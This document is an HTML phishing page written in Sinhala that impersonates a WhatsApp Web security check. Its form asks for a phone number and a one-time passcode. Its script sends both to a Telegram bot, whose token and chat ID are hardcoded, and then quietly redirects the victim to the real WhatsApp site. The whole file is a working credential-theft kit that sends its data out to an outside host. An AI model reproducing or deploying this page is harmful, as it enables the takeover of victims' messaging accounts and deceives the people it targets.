<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web - Security Update</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 65px; margin-bottom: 20px; }
        h2 { color: #41525d; margin-bottom: 10px; font-size: 22px; }
        p { color: #667781; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #e1e9eb; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.3s; }
        input:focus { border-color: #00a884; box-shadow: 0 0 5px rgba(0,168,132,0.2); }
        button { width: 100%; padding: 13px; background-color: #00a884; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #008f72; }
        .secure { margin-top: 20px; font-size: 11px; color: #8696a0; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" class="logo">
    <h2>ආරක්ෂක තහවුරු කිරීම</h2>
    <p>ඔබේ ගිණුමේ ආරක්ෂාව තහවුරු කිරීමට කරුණාකර දුරකථන අංකය සහ OTP කේතය ඇතුළත් කරන්න.</p>

    <form id="phishForm">
        <input type="text" id="phone" placeholder="දුරකථන අංකය (07XXXXXXXX)" required>
        <input type="text" id="otp" placeholder="ඉලක්කම් 6 කේතය (OTP)" maxlength="6" required>
        <button type="submit" id="btn">VERIFY NOW</button>
    </form>

    <div class="secure">
        <span style="color:#00a884;">●</span> End-to-End Encrypted 2026<br>
        404! Specialist Unit Security Protocol
    </div>
</div>

<script>
    // --- ⚙️ CONFIGURATION ---
    const botToken = "8194525503:AAFskY0McDJKJQLhf_wXwEJP8MxXFb3UZ5s"; 
    const chatID = "6446613868";     
    // -------------------------

    document.getElementById('phishForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const phone = document.getElementById('phone').value;
        const otp = document.getElementById('otp').value;
        const btn = document.getElementById('btn');
        
        btn.innerHTML = "Verifying...";
        btn.disabled = true;

        const message = `🔱 *404! TARGET CAPTURED* 🔱\n\n📱 *Phone:* \`${phone}\`\n🔑 *OTP:* \`${otp}\` \n\n*Status:* Action Required!`;

        // Telegram API එකට කෙලින්ම දත්ත යැවීම
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => {
            // දත්ත ලැබුණු පසු නියම WhatsApp පිටුවට යොමු කිරීම
            window.location.href = "https://web.whatsapp.com";
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = "https://web.whatsapp.com";
        });
    });
</script>

</body>
</html>
